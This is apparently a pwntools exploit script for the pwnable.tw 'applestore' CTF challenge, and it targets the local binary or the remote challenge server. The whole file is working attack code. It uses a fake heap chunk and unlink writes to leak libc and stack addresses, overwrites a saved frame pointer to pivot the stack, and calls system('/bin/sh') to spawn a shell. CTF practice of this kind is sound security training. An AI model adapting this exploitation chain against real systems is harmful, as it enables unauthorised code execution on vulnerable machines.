from pwn import *


# Constants found by manual enumeration
MYCART_ADDR = 0x0804b068
PREV_TO_FAKE_CHUNK_OFFSET = 1192
HANDLER_RA_OFFSET = 0xe6c     # from fake_chunk_addr
HANDLER_EBP_OFFSET = 0x60     # from fake_chunk_addr 
HANDLER_CMD_BUF_OFFSET = 0x40 # from fake_chunk_addr
BINSH_OFFSET = 0x158e8b


def i2b(i):
    return str(i).encode('utf-8')


def parse_leaked_addr(la):
    return u32(la[10:14])


def read_menu():
    p.recvuntil(
        b'=== Menu ===\n',
        b'1: Apple Store\n',
        b'2: Add into your shopping cart\n',
        b'3: Remove from your shopping cart\n',
        b'4: List your shopping cart\n',
        b'5: Checkout\n',
        b'6: Exit\n'
    )


def add(device_num):
    p.sendafter(b'> ', b'2')
    p.sendafter(b'Device Number> ', i2b(device_num))
    p.recvuntil((b'You\'ve put *iPhone 6 Plus* in your shopping cart.\n',
                b'Brilliant! That\'s an amazing idea.\n'))


def remove(idx):
    p.sendafter(b'> ', b'3')
    p.sendafter(b'Item Number> ', idx)
    resp = p.recvuntil(b'> ')
    p.unrecv(b'> ')
    return resp


def display_cart(answer):
    p.sendafter(b'> ', b'4')
    p.sendafter(b'Let me check your cart. ok? (y/n) > ', answer)
    if answer[0] == b'y':
        resp = p.recvuntil(b'> ')
        p.unrecv(b'> ')
        return resp
    return b''


def checkout(answer):
    p.sendafter(b'> ', b'5')
    p.sendafter(b'Let me check your cart. ok? (y/n) > ', answer)
    resp = p.recvuntil(b'Want to checkout? Maybe next time!\n')
    return resp


def exit_handler():
    p.sendafter(b'> ', b'6')
    p.recvuntil(b'Thank You for Your Purchase!\n')


###############################################################################
## Setup the environment
###############################################################################
# context.log_level = 'debug'

e = ELF('./applestore')
libc = ELF('./libc_32.so.6')
if len(sys.argv) >= 2 and sys.argv[1] == 'remote':
    p = remote('chall.pwnable.tw', 10104)
else:
    p = process('./applestore', env={'LD_PRELOAD': './libc_32.so.6'})

if len(sys.argv) >= 3 and sys.argv[2] == 'debug':
    gdb.attach(p)
    raw_input(b'Continue and press ENTER key to send payload')

###############################################################################
## Exploit
###############################################################################
# Set total item price in cart to 7174
for i in range(20):
    add(2) # item price 299$
for i in range(6):
    add(1) # item price 199$
log.info('[x] Set total item price in cart to 7174')

# Allocate fake chunk
checkout(b'y')
log.info('[x] Allocated fake chunk')


# leak libc_base
fake_chunk = p32(e.got['puts']) + b'XXXX' + p32(0) + p32(0)
puts_addr = parse_leaked_addr(remove(i2b(27) + fake_chunk))
log.info('[x] Leaked puts_addr address: ' + hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
log.info('[x] Calculated libc_base from puts_addr: ' + hex(libc_base))


# leak fake_chunk_addr and then determinate ra_addr
fake_chunk = p32(MYCART_ADDR + 8) + b'XXXX' + p32(0) + p32(0)
prev_to_fake_chunk_addr = parse_leaked_addr(remove(i2b(27) + fake_chunk)) + PREV_TO_FAKE_CHUNK_OFFSET
log.info(f'[x] Prev to fake chunk addr: {hex(prev_to_fake_chunk_addr)}')

fake_chunk = p32(prev_to_fake_chunk_addr + 8) + b'XXXX' + p32(0) + p32(0)
fake_chunk_addr = parse_leaked_addr(remove(i2b(27) + fake_chunk))
log.info(f'[x] Fake chunk addr: {hex(fake_chunk_addr)}')


# overwrite ebp_handler, so when program returns from main, we get stack pivoting
handler_ebp_delete = fake_chunk_addr + HANDLER_EBP_OFFSET
handler_cmd_buf = fake_chunk_addr + HANDLER_CMD_BUF_OFFSET
fake_chunk = p32(e.got['puts']) + b'XXXX'  + p32(handler_cmd_buf - 5) + p32(handler_ebp_delete - 8)
remove(i2b(27) + fake_chunk)
log.info(f'[x] Overwriten stored ebp, will cause stack pivot when returning from main')


# place call to system('/bin/sh') on fake stack
p.sendline(b'6' + p32(libc_base + libc.symbols['system']) + b'XXXX' + p32(libc_base + BINSH_OFFSET) + p32(0) + p32(0))
log.info(f'[x] Prepared call to system(\'/bin/sh)')

exit_handler()
log.info(f'[x] Exited handler and will get shell in a sec')

p.interactive()